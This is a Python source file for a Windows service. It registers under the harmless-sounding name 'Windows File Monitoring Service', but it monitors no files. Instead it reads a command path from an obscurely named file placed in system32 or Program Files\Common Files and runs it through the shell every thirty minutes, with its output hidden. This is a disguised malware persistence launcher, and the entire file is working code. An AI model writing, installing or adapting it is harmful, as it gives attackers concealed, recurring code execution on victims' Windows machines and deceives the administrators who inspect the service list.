import win32service
import win32serviceutil
import win32event
import win32evtlogutil
import win32traceutil
import servicemanager
import winerror
import time
import sys
import os
import subprocess
class aservice(win32serviceutil.ServiceFramework):
    _svc_name_ = "windows_monitoring"
    _svc_display_name_ = "Windows File Monitoring Service"
    _svc_deps_ = ["EventLog"]
    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.isAlive = True
    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        self.isAlive = False
    def SvcDoRun(self):
        import servicemanager
        self.timeout = 1000  # In milliseconds (update every second)
        while self.isAlive:
            rc = win32event.WaitForSingleObject(self.hWaitStop, self.timeout)
            windir = os.environ['WINDIR']
            homedir_path = os.getenv("SystemDrive")
            homedir_path = homedir_path + "\\Program Files\\Common Files\\"
            windows_version = sys.getwindowsversion()[2]
            windows_version = int(windows_version)
            if windows_version < 3791:
                fileopen = open("%s\\system32\\isjxwqjs" % (windir), "r")
            if windows_version > 3791:
                fileopen = open("%s\\isjxwqjs" % (homedir_path), "r")
            for line in fileopen:
                set_path = line.rstrip()
            subprocess.Popen('%s' % (set_path), shell=True, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            time.sleep(1800)
            self.ReportServiceStatus(win32service.SERVICE_STOPPED)
        return
if __name__ == '__main__':
    if len(sys.argv) == 1:
        try:
            evtsrc_dll = os.path.abspath(servicemanager.__file__)
            servicemanager.PrepareToHostSingle(aservice)
            servicemanager.Initialize('aservice', evtsrc_dll)
            servicemanager.StartServiceCtrlDispatcher()
        except win32service.error as details:
            if details[0] == winerror.ERROR_FAILED_SERVICE_CONTROLLER_CONNECT:
                win32serviceutil.usage()
    else:
        win32serviceutil.HandleCommandLine(aservice)